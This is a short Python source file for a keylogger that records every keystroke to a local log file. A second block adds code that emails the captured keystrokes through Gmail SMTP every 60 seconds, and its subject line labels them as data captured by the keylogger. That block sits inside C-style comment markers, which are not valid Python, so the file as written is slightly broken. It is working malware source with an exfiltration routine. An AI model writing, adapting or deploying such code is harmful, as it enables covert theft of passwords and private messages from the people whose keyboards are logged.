#Need to install this
from pynput import keyboard 

ignore = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

#Pretty simple code easily understandable

def on_press(key):
    try: 
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in ignore:
                pass 
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


/*
If i want to send this to a mail
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

EMAIL_ORIGEM = "Totallyamail0@gmail.com"
EMAIL_DESTINO= "Totallyamail@gmail.com"
SENHA_EMAIL = "Insert functional password"
#Should be different mails and two passwords probably


def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

#Add another function to the main
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
*/
